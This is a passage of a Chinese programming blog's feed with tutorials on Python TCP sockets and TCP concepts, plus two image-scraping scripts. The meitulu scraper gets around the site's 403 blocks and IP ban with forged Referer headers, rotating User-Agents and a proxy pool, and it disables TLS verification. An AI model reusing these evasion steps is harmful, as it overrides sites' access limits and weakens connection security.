class="line">        <span class="comment"># 关闭这个套接字</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭监听套接字</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="客户端-参考代码如下"><a href="#客户端-参考代码如下" class="headerlink" title="客户端 参考代码如下:"></a>客户端 参考代码如下:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建socket</span></span><br><span class="line">    tcp_client_socket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 目的信息</span></span><br><span class="line">    server_ip = input(<span class="string">"请输入服务器ip:"</span>)</span><br><span class="line">    server_port = int(input(<span class="string">"请输入服务器port:"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 链接服务器</span></span><br><span class="line">    tcp_client_socket.connect((server_ip, server_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入需要下载的文件名</span></span><br><span class="line">    file_name = input(<span class="string">"请输入要下载的文件名："</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送文件下载请求</span></span><br><span class="line">    tcp_client_socket.send(file_name.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收对方发送过来的数据，最大接收1024个字节（1K）</span></span><br><span class="line">    recv_data = tcp_client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># print('接收到的数据为:', recv_data.decode('utf-8'))</span></span><br><span class="line">    <span class="comment"># 如果接收到数据再创建文件，否则不创建</span></span><br><span class="line">    <span class="keyword">if</span> recv_data:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"[接收]"</span>+file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(recv_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    tcp_client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="tcp的3次握手"><a href="#tcp的3次握手" class="headerlink" title="tcp的3次握手"></a>tcp的3次握手</h1><p><img src="imges_tcp/005.png" alt></p><h1 id="tcp的4次挥手"><a href="#tcp的4次挥手" class="headerlink" title="tcp的4次挥手"></a>tcp的4次挥手</h1><p><img src="imges_tcp/006.png" alt></p><h1 id="tcp长连接和短连接"><a href="#tcp长连接和短连接" class="headerlink" title="tcp长连接和短连接"></a>tcp长连接和短连接</h1><p>TCP在真正的读写操作之前，server与client之间必须建立一个连接，当读写操作完成后，双方不再需要这个连接时它们可以释放这个连接，连接的建立通过三次握手，释放则需要四次握手，所以说每个连接的建立都是需要资源消耗和时间消耗的。</p><p>TCP通信的整个过程，如下图:<br><img src="/images_tcp/006.png" alt></p><h2 id="TCP短连接"><a href="#TCP短连接" class="headerlink" title="TCP短连接"></a>TCP短连接</h2><p>模拟一种TCP短连接的情况:</p><pre><code>1. client 向 server 发起连接请求2. server 接到请求，双方建立连接3. client 向 server 发送消息4. server 回应 client5. 一次读写完成，此时双方任何一个都可以发起 close 操作</code></pre><p>在步骤5中，一般都是 client 先发起 close 操作。当然也不排除有特殊的情况。<br>从上面的描述看，短连接一般只会在 client/server 间传递一次读写操作！</p><h2 id="TCP长连接"><a href="#TCP长连接" class="headerlink" title="TCP长连接"></a>TCP长连接</h2><p>再模拟一种长连接的情况:</p><pre><code>1. client 向 server 发起连接2. server 接到请求，双方建立连接3. client 向 server 发送消息4. server 回应 client5. 一次读写完成，连接不关闭6. 后续读写操作...7. 长时间操作之后client发起关闭请求</code></pre><h2 id="TCP长-短连接操作过程"><a href="#TCP长-短连接操作过程" class="headerlink" title="TCP长/短连接操作过程"></a>TCP长/短连接操作过程</h2><h3 id="短连接的操作步骤是："><a href="#短连接的操作步骤是：" class="headerlink" title="短连接的操作步骤是："></a>短连接的操作步骤是：</h3><p>建立连接——数据传输——关闭连接…建立连接——数据传输——关闭连接<br><img src="/images_tcp/007.png" alt></p><h3 id="长连接的操作步骤是："><a href="#长连接的操作步骤是：" class="headerlink" title="长连接的操作步骤是："></a>长连接的操作步骤是：</h3><p>建立连接——数据传输…（保持连接）…数据传输——关闭连接<br><img src="/images_tcp/008.png" alt></p><h2 id="TCP长-短连接的优点和缺点"><a href="#TCP长-短连接的优点和缺点" class="headerlink" title="TCP长/短连接的优点和缺点"></a>TCP长/短连接的优点和缺点</h2><ul><li>长连接可以省去较多的TCP建立和关闭的操作，减少浪费，节约时间。</li><li>对于频繁请求资源的客户来说，较适用长连接。</li><li>client与server之间的连接如果一直不关闭的话，会存在一个问题，</li><li>随着客户端连接越来越多，server早晚有扛不住的时候，这时候server端需要采取一些策略，</li><li>如关闭一些长时间没有读写事件发生的连接，这样可以避免一些恶意连接导致server端服务受损；</li><li>如果条件再允许就可以以客户端机器为颗粒度，限制每个客户端的最大长连接数，</li><li>这样可以完全避免某个蛋疼的客户端连累后端服务。</li><li>短连接对于服务器来说管理较为简单，存在的连接都是有用的连接，不需要额外的控制手段。</li><li>但如果客户请求频繁，将在TCP的建立和关闭操作上浪费时间和带宽。</li></ul><h2 id="TCP长-短连接的应用场景"><a href="#TCP长-短连接的应用场景" class="headerlink" title="TCP长/短连接的应用场景"></a>TCP长/短连接的应用场景</h2><ul><li>长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况。<br>每个TCP连接都需要三次握手，这需要时间，如果每个操作都是先连接，<br>再操作的话那么处理速度会降低很多，所以每个操作完后都不断开，<br>再次处理时直接发送数据包就OK了，不用建立TCP连接。<br>例如：数据库的连接用长连接，如果用短连接频繁的通信会造成socket错误，<br>而且频繁的socket 创建也是对资源的浪费。</li><li>而像WEB网站的http服务一般都用短链接，因为长连接对于服务端来说会耗费一定的资源，<br>而像WEB网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源，<br>如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，<br>那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短链接好。</li></ul><h1 id="tcp-ip简介"><a href="#tcp-ip简介" class="headerlink" title="tcp-ip简介"></a>tcp-ip简介</h1><h2 id="什么是协议"><a href="#什么是协议" class="headerlink" title="什么是协议"></a>什么是协议</h2><p>为了解决不同种族人之间的语言沟通障碍，现规定国际通用语言是英语，这就是一个规定，这就是协议</p><h2 id="计算机网络沟通用什么"><a href="#计算机网络沟通用什么" class="headerlink" title="计算机网络沟通用什么"></a>计算机网络沟通用什么</h2><p>不同的计算机只需要能够联网（有线无线都可以）那么就可以相互进行传递数据<br>就像说不同语言的人沟通一样，只要有一种大家都认可都遵守的协议即可，那么这个计算机都遵守的网络通信协议叫做TCP/IP协议</p><h2 id="TCP-IP协议-族"><a href="#TCP-IP协议-族" class="headerlink" title="TCP/IP协议(族)"></a>TCP/IP协议(族)</h2><p>为了把全世界的所有不同类型的计算机都连接起来，就必须规定一套全球通用的协议，为了实现互联网这个目标，互联网协议族（Internet Protocol Suite）就是通用协议标准。<br>因为互联网协议包含了上百种协议标准，但是最重要的两个协议是TCP和IP协议，所以，大家把互联网的协议简称TCP/IP协议(族)<br>常用的网络协议如下图所示：<br><img src="/images_tcp/009.png" alt></p><p><img src="/images_tcp/010.png" alt></p><p>说明：</p><ul><li>网际层也称为：网络层</li><li>网络接口层也称为：链路层</li></ul><p>另外一套标准:<br><img src="/images_tcp/011.png" alt></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;TCP简介&quot;&gt;&lt;a href=&quot;#TCP简介&quot; class=&quot;headerlink&quot; title=&quot;TCP简介&quot;&gt;&lt;/a&gt;TCP简介&lt;/h1&gt;&lt;h2 id=&quot;TCP介绍&quot;&gt;&lt;a href=&quot;#TCP介绍&quot; class=&quot;headerlink&quot; title=&quot;TCP介绍&quot;&gt;&lt;/a&gt;TCP介绍&lt;/h2&gt;&lt;p&gt;TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。&lt;br&gt;TCP通信需要经过创建连接、数据传送、终止连接三个步骤。&lt;br&gt;TCP通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，”打电话””&lt;/p&gt;&lt;h2 id=&quot;TCP特点&quot;&gt;&lt;a href=&quot;#TCP特点&quot; class=&quot;headerlink&quot; title=&quot;TCP特点&quot;&gt;&lt;/a&gt;TCP特点&lt;/h2&gt;&lt;h3 id=&quot;面向连接&quot;&gt;&lt;a href=&quot;#面向连接&quot; class=&quot;headerlink&quot; title=&quot;面向连接&quot;&gt;&lt;/a&gt;面向连接&lt;/h3&gt;&lt;p&gt;通信双方必须先建立连接才能进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输。&lt;br&gt;双方间的数据传输都可以通过这一个连接进行。&lt;br&gt;完成数据交换后，双方必须断开此连接，以释放系统资源。&lt;br&gt;这种连接是一对一的，因此TCP不适用于广播的应用程序，基于广播的应用程序请使用UDP协议。&lt;/p&gt;&lt;h3 id=&quot;可靠传输&quot;&gt;&lt;a href=&quot;#可靠传输&quot; class=&quot;headerlink&quot; title=&quot;可靠传输&quot;&gt;&lt;/a&gt;可靠传输&lt;/h3&gt;&lt;ol&gt;&lt;li&gt;TCP采用发送应答机制&lt;br&gt;TCP发送的每个报文段都必须得到接收方的应答才认为这个TCP报文段传输成功&lt;/li&gt;&lt;li&gt;超时重传&lt;br&gt;发送端发出一个报文段之后就启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段。&lt;br&gt;TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。&lt;/li&gt;&lt;/ol&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="tcp" scheme="https://yongnights.github.io/tags/tcp/"/>
    
  </entry>
  
  <entry>
    <title>爬取干货集中营的图片</title>
    <link href="https://yongnights.github.io/2019/12/31/%E7%88%AC%E5%8F%96%E5%B9%B2%E8%B4%A7%E9%9B%86%E4%B8%AD%E8%90%A5%E7%9A%84%E5%9B%BE%E7%89%87/"/>
    <id>https://yongnights.github.io/2019/12/31/爬取干货集中营的图片/</id>
    <published>2019-12-31T04:00:48.284Z</published>
    <updated>2019-12-31T04:00:48.284Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h3 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h3><pre><code>http://gank.io/</code></pre><h3 id="分析网站"><a href="#分析网站" class="headerlink" title="分析网站"></a>分析网站</h3><pre><code>网站地址:https://gank.io/, 要爬取的是网站首页上展示出来的图片</code></pre><p><img src="https://i.imgur.com/6Mkilm4.jpg" alt></p><a id="more"></a><pre><code>在网站首页底部左上角有API地址,点击进入到干货集中营 API 文档</code></pre><p><img src="https://i.imgur.com/crIyWfb.png" alt></p><pre><code>其中有这样的内容显示,如下图：</code></pre><p><img src="https://i.imgur.com/oHqL8X3.png" alt></p><pre><code>尝试访问:https://gank.io/api/data/福利/10/1, 出来如下的json数据：</code></pre><p><img src="https://i.imgur.com/mezrl8t.png" alt></p><pre><code>通过API文档描述,可以知道链接地址中的请求个数和请求页数,获取到所有的图片信息。比如:https://gank.io/api/data/福利/700/1, 请求700条数据,获取第一页,发现返回的结果中总共有670条数据(截止到20190314),第二页没有数据.再次请求:https://gank.io/api/data/福利/600/1, 请求600条数据,获取第一页,发现确实有600条数据,然后再请求第二页(https://gank.io/api/data/福利/600/2),有70条数据。结合以上分析,截止到今天(20190314),共有670条数据,避免使用翻页的情况,就直接使用如下网址获取全部数据:https://gank.io/api/data/福利/700/1根据获取到的son数据,提取出所需要的图片链接,最后下载这些图片并保存.</code></pre><h3 id="实际代码"><a href="#实际代码" class="headerlink" title="实际代码"></a>实际代码</h3><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import datetimeimport osfrom _md5 import md5import requestsfrom requests import RequestExceptiondef get_one_page(url):    try:        response = requests.get(url)        if response.status_code == 200:            return response.json()    except:        return Nonedef utc_to_local(utc_time_str, utc_format=&apos;%Y-%m-%dT%H:%M:%S.%fZ&apos;):    &quot;&quot;&quot;    &quot;2015-06-05T03:54:29.403Z&quot;格式的时间转换成2015-06-05 11:54:29    &quot;&quot;&quot;    local_format = &quot;%Y-%m-%d %H:%M:%S&quot;    utc_dt = datetime.datetime.strptime(utc_time_str, utc_format)    local_dt = utc_dt + datetime.timedelta(hours=8)    time_str = local_dt.strftime(local_format)    return time_strdef https_to_http(url):    &quot;&quot;&quot;    把图片链接是https的换成http    &quot;&quot;&quot;    if url[0:5] == &apos;https&apos;:        url = url.replace(url[0:5], &apos;http&apos;)    return urldef parse_one_page(html):    items = html[&apos;results&apos;]    for item in items:        yield {            &apos;id&apos;: item[&apos;_id&apos;],            &apos;publishedAt&apos;: utc_to_local(item[&apos;publishedAt&apos;]),            &apos;url&apos;: https_to_http(item[&apos;url&apos;])        }# 请求图片url,获取图片二进制数据def download_image(url):    try:        response = requests.get(url)        if response.status_code == 200:            save_image(response.content)  # response.contenter二进制数据 response.text文本数据        return None    except RequestException:        print(&apos;请求图片出错&apos;, url)        return Nonedef save_image(content):    &quot;&quot;&quot;    需要提前建好目录D:\\pachong\\gank1\\    &quot;&quot;&quot;    file_path = &apos;D:\\pachong\\gank1\\{1}.{2}&apos;.format(os.getcwd(), md5(content).hexdigest(), &apos;jpg&apos;)    if not os.path.exists(file_path):        with open(file_path, &apos;wb&apos;) as f:            f.write(content)def main():    url = &apos;http://gank.io/api/data/福利/700/1&apos;    html = get_one_page(url)    for item in parse_one_page(html):        download_image(item[&apos;url&apos;])if __name__ == &apos;__main__&apos;:    main()</code></pre><h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><pre><code>总共700条json数据,实际只有564条数据,通过分析获取到的图片url,发现有些图片url链接本身已失效,使用浏览器打开这些图片链接会报如下错误:</code></pre><p><img src="https://i.imgur.com/2s8gC9m.png" alt></p><pre><code>失效链接展示:</code></pre><p><img src="https://i.imgur.com/4BlHV74.png" alt></p><pre><code>实际结果：</code></pre><p><img src="https://i.imgur.com/bNlaWbd.jpg" alt></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h3 id=&quot;网站地址&quot;&gt;&lt;a href=&quot;#网站地址&quot; class=&quot;headerlink&quot; title=&quot;网站地址&quot;&gt;&lt;/a&gt;网站地址&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;http://gank.io/
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;分析网站&quot;&gt;&lt;a href=&quot;#分析网站&quot; class=&quot;headerlink&quot; title=&quot;分析网站&quot;&gt;&lt;/a&gt;分析网站&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;网站地址:https://gank.io/, 要爬取的是网站首页上展示出来的图片
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6Mkilm4.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="爬虫" scheme="https://yongnights.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="美女" scheme="https://yongnights.github.io/tags/%E7%BE%8E%E5%A5%B3/"/>
    
  </entry>
  
  <entry>
    <title>爬取美图录网站图片</title>
    <link href="https://yongnights.github.io/2019/12/31/%E7%88%AC%E5%8F%96%E7%BE%8E%E5%9B%BE%E5%BD%95%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/"/>
    <id>https://yongnights.github.io/2019/12/31/爬取美图录网站图片/</id>
    <published>2019-12-31T04:00:48.284Z</published>
    <updated>2019-12-31T04:00:48.284Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h3 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h3><pre><code>https://www.meitulu.com/</code></pre><h3 id="分析该网站"><a href="#分析该网站" class="headerlink" title="分析该网站"></a>分析该网站</h3><pre><code>1. 打开网站地址后，查看网站右侧导航菜单，目标是提取出爬取网站图片所需的链接地址，这些链接地址最好是包含整个网站的链接地址。</code></pre><p><img src="https://i.imgur.com/zJMMLna.png" alt></p><a id="more"></a><pre><code>2. 随便点开一个图集分类下的类别，比如&quot;女神&quot;，，进入到的链接地址是：https://www.meitulu.com/t/nvshen/. </code></pre><p><img src="https://i.imgur.com/YktKpZe.png" alt></p><pre><code>3. 从中随便选一个图集点开，进入到该图集的详情页面。上面显示的该图集的相关信息，下面显示的是该图集的每张图片。   右上角显示的是该图集的当前位置。注意这个当前位置。</code></pre><p><img src="https://i.imgur.com/LRmpzoR.jpg" alt></p><pre><code>4. 再从图集类别中选一个进入到该图集的详情页面，发现右上角也有当前位置。</code></pre><p><img src="https://i.imgur.com/S9n6Kpn.jpg" alt></p><pre><code>5. 点击导航菜单中的精选美女，进入到某一个图集详情页面，发现右上角也有当前位置。</code></pre><p><img src="https://i.imgur.com/DoWAv1W.jpg" alt></p><pre><code>6. 点击导航菜单中的日韩美女，进入到某一个图集详情页面，发现右上角也有当前位置。</code></pre><p><img src="https://i.imgur.com/fQzVhCY.jpg" alt></p><pre><code>7. 经过以上分析可知，该网站的图集分为如下三大类：日韩美女，港台美女和国产美女。图集分类中是每一个图集的标签汇总。8. 提取出图集三大类的地址如下：日韩美女：https://www.meitulu.com/rihan/, 港台美女：https://www.meitulu.com/gangtai/， 国产美女：https://www.meitulu.com/guochan/, 经查看这三个网址，只有最后的不一样，前面的网址等都是一样的，可以构造列表来遍历循环使用，[&apos;rihan&apos;,&apos;gangtai&apos;,&apos;guochan&apos;]9. 假如进入国产美女里。通过分析页面信息，每一个图集信息都是在一个li标签里，可以使用正则表达式提取出这些li标签。</code></pre><p><img src="https://i.imgur.com/eyZKAQe.png" alt></p><pre><code>10.点击其中一个图集，其链接是：https://www.meitulu.com/item/16889.html, 进入到该图集的详情页面.最上面显示该图集的图片共有96张，每页显示4张图片，拉到最后的第24页，24*4=96张。</code></pre><p><img src="https://i.imgur.com/jDZcdii.png" alt></p><pre><code>10.查看该图集下的每一个图片链接，发现是在一个img标签里，第一个的4张图片地址依次是：https://mtl.ttsqgs.com/images/img/16889/1.jpg， https://mtl.ttsqgs.com/images/img/16889/2.jpg， https://mtl.ttsqgs.com/images/img/16889/3.jpg，https://mtl.ttsqgs.com/images/img/16889/4.jpg，</code></pre><p><img src="https://i.imgur.com/5lCB65u.png" alt></p><pre><code>最后24页的4张图片地址链接是：https://www.meitulu.com/item/16889_24.html， 每一个图片的地址依次是：    https://mtl.ttsqgs.com/images/img/16889/93.jpg，    https://mtl.ttsqgs.com/images/img/16889/94.jpg，    https://mtl.ttsqgs.com/images/img/16889/95.jpg，    https://mtl.ttsqgs.com/images/img/16889/96.jpg</code></pre><p><img src="https://i.imgur.com/dyq5K7p.png" alt></p><pre><code>同时页面显示的有&quot;美图录提示：点击图片，查看原尺寸高清大图&quot;,js代码是:    function() {         window.open(&quot;/img.html?img=&quot; + this.src + &quot;&quot;)    }点击图片进入原尺寸高清大图，复制出网址如下：https://www.meitulu.com/img.html?img=https://mtl.ttsqgs.com/images/img/16889/1.jpg。</code></pre><p><img src="https://i.imgur.com/0D6MLbR.png" alt></p><pre><code>11. 分析第10步的图片链接，可以发现：(1)图集链接地址(https://www.meitulu.com/item/16889.html)中的数字16889跟该图集中的每一个张图片的链接地址(https://mtl.ttsqgs.com/images/img/16889/1.jpg)相关.(2)每一个图片的链接地址最后的数字是从1开始的，一直到该图集的总数第96(2)图集详情页中的图片总数跟图集分页数有关，图片总数除以4，若有余数再加1，得到的数字就是该图集的分页数。(3)该图集的链接地址也有规律，比如图集的第一页地址是：https://www.meitulu.com/item/16889.html， 第二页的是：https://www.meitulu.com/item/16889_2.html， 最后第24页的是：https://www.meitulu.com/item/16889_24.html。(4)经过以上分析，优先采用(1)和(2)中得到的规律，提取出每一个图集的名称，图集的链接和图片总数，然后构造该图集下的每一个图片的链接。(5)图集的链接也有规律，比如国产美女分类，第一页的地址是：https://www.meitulu.com/guochan/， 第二页的地址是：https://www.meitulu.com/guochan/2.html， 第164页的地址是：https://www.meitulu.com/guochan/164.html。 可以采用遍历的方式。</code></pre><h3 id="实际操作中的坑"><a href="#实际操作中的坑" class="headerlink" title="实际操作中的坑"></a>实际操作中的坑</h3><pre><code>1. 使用requests的get方式请求每一个图片的链接，得到的图片是损坏的，向群里其他人请教得知，请求是需要加上headers头部信息，必须有Referer，且Referer参数值还有要求，比如说某张图片的图片地址是：https://mtl.ttsqgs.com/images/img/16889/13.jpg， 则Referer的值是https://www.meitulu.com/img.html?img=https://mtl.ttsqgs.com/images/img/16889/13.jpg， 注意查看这俩网址之间的关系。2. 请求次数过多会报403 Forbidden，通过使用模块fake_useragent生成随机的User-Agent信息。可以解决一小部分情况，时间一长还是会再次报403 Forbidden，只能再次随机生成不同的User-Agent值。3. 时间长的话会出现这样一个情况，往后的每个图集只能下载保存前9张图片，以后的图片访问请求均报403 Forbidden，这个估计是封IP了，所以还需要使用代理才行。4. 在网上找到的一个能用的代理软件，地址是：https://github.com/chenjiandongx/async-proxy-pool， 若使用的redis版本低于3.0，则代理池代码可以直接运行使用，若高于3.0版本，则需要修改其中一个文件，具体如下：async_proxy_pool/database.py，修改其中的第45行，原先是self.redis.zadd(REDIS_KEY, proxy, score)，修改成：self.redis.zadd(REDIS_KEY, ｛proxy： score｝)。5. 使用代理(1)运行客户端，启动收集器和校验器：python3 client.py(2)运行服务器，启动 web 服务:python3 server_flask.py(3)获取代理地址信息import requestsproxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;)proxies = proxy.json()print(proxies)(4)爬虫代码中使用代理跟(3)合二为一import requestsproxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;)requests.get(&quot;http://example.org&quot;, proxies=proxies)</code></pre><h3 id="实际代码"><a href="#实际代码" class="headerlink" title="实际代码"></a>实际代码</h3><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import osimport randomimport reimport requestsfrom fake_useragent import UserAgentfrom requests.exceptions import RequestException</code></pre><p>​</p><pre><code># 获取三大分类页面详细数据def get_one_page(url):    try:        response = requests.get(url)        if response.status_code == 200:            response.encoding = &apos;utf8&apos;            return response.text        else:            return None    except RequestException:        print(&apos;请求失败&apos;)        return None</code></pre><p>​</p><pre><code># 解析三大分类页面数据，提取需要的数据def parse_one_page(html):    pattern = re.compile(&apos;&lt;li&gt;.*?&lt;p&gt;数量： (.*?) 张&lt;/p&gt;.*?&lt;p class=p_title&gt;&lt;a href=&quot;(.*?)&quot;.*?&gt;(.*?)&lt;/a&gt;&lt;/p&gt;.*?&lt;/li&gt;&apos;,                         re.S | re.M)    items = re.findall(pattern, html)    for i in range(len(items)):        yield {            &apos;num&apos;: int(items[i][0]),  # 获取图集的图片总数            &apos;name&apos;: items[i][2],  # 获取图集名称            &apos;url&apos;: items[i][1].split(&apos;/&apos;)[4][:-5],  # 获取图集id        }</code></pre><p>​</p><pre><code># 获取随机请求头def GetUserAgent():    ua = UserAgent()    return random.choice([ua.safari, ua.firefox, ua.chrome, ua.opera, ua.ie, ua.random])</code></pre><p>​</p><pre><code># 获取随机代理地址,因爬取速度慢，暂不使用def GetProxy():    proxy = requests.get(&apos;http://192.168.0.200:3289/pop&apos;)    proxies = proxy.json()    return proxies</code></pre><p>​</p><pre><code># 请求图片链接地址def download_image(item):    try:        file_path = item[&apos;name&apos;]  # 获取图集名称        id = item[&apos;url&apos;]  # 获取图集id        num = item[&apos;num&apos;]  # 获取图集的图片总数        for i in range(1, num + 1):            url = f&apos;https://mtl.ttsqgs.com/images/img/{id}/{i}.jpg&apos;  # 使用f-string的方式拼接字符串            headers = {  # 构造请求头                &apos;User-Agent&apos;: GetUserAgent(),                &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,                &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;,                &apos;Accept-Language&apos;: &apos;zh-CN,en-US;q=0.8,zh;q=0.5,en;q=0.3&apos;,                &apos;Referer&apos;: &apos;https://www.meitulu.com/img.html?img=%s&apos; % url,            }            yield {                &apos;name&apos;: file_path,                &apos;headers&apos;: headers,                &apos;i&apos;: i,                &apos;url&apos;: url,                &apos;num&apos;: num            }    except RequestException:        print(&apos;请求图片出错&apos;)        return None</code></pre><p>​</p><pre><code># 保存图片，使用第三方错误重试模块，该模块需要导入# @retry(stop_max_attempt_number=3)def save_image(path, x):    name = x[&apos;name&apos;]    i = x[&apos;i&apos;]    headers = x[&apos;headers&apos;]    url = x[&apos;url&apos;]    num = x[&apos;num&apos;]    base_path = f&apos;{os.getcwd()}{os.sep}{path}{os.sep}{name}&apos;    if not os.path.exists(base_path):        os.makedirs(base_path)    save_path = f&apos;{base_path}{os.sep}{i}.jpg&apos;    if not os.path.exists(save_path):        try:            requests.packages.urllib3.disable_warnings()            response = requests.get(url, headers=headers, verify=False)        except:            print(f&apos;请求{name}图集的第{i}张图片链接地址失败,共{num}张,图片链接是{url}&apos;)        else:            if response.status_code == 200:                try:                    with open(save_path, &apos;wb&apos;) as f:                        f.write(response.content)                        print(f&apos;保存{name}图集的第{i}张图片成功,共{num}张&apos;)                except:                    print(f&apos;保存{name}图集的第{i}张图片失败,共{num}张,图片链接是{url}&apos;)            else:                print(f&apos;请求{name}图集的第{i}张图片链接地址状态不是200,共{num}张,图片链接是{url}&apos;)    else:        print(f&apos;{name}图集文件夹已存在,请求一下图集&apos;)# 遍历三大分类def img_url():    img_ict = {&apos;rihan&apos;: 88, &apos;gangtai&apos;: 36, &apos;guochan&apos;: 165}    for k, v in img_ict.items():        yield {            &apos;name&apos;: k,            &apos;num&apos;: v        }# 新传分类名称def main():    for img_u in img_url():        for i in range(1, img_u[&apos;num&apos;]):            if i == 1:                url = f&apos;https://www.meitulu.com/{img_u[&quot;name&quot;]}/&apos;            else:                url = f&apos;https://www.meitulu.com/{img_u[&quot;name&quot;]}/{i}.html&apos;            html = get_one_page(url)            for item in parse_one_page(html):                for x in download_image(item):                    save_image(img_u[&apos;name&apos;], x)</code></pre><p>​<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>main()</p><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://i.imgur.com/a4CQfBm.png" alt></p><p><img src="https://i.imgur.com/Atho4b7.png" alt></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h3 id=&quot;网站地址&quot;&gt;&lt;a href=&quot;#网站地址&quot; class=&quot;headerlink&quot; title=&quot;网站地址&quot;&gt;&lt;/a&gt;网站地址&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;https://www.meitulu.com/
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;分析该网站&quot;&gt;&lt;a href=&quot;#分析该网站&quot; class=&quot;headerlink&quot; title=&quot;分析该网站&quot;&gt;&lt;/a&gt;分析该网站&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;1. 打开网站地址后，查看网站右侧导航菜单，目标是提取出爬取网站图片所需的链接地址，这些链接地址最好是包含整个网站的链接地址。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/zJMMLna.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="爬虫" scheme="https://yongnights.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="美女" scheme="https://yongnights.github.io/tags/%E7%BE%8E%E5%A5%B3/"/>
    
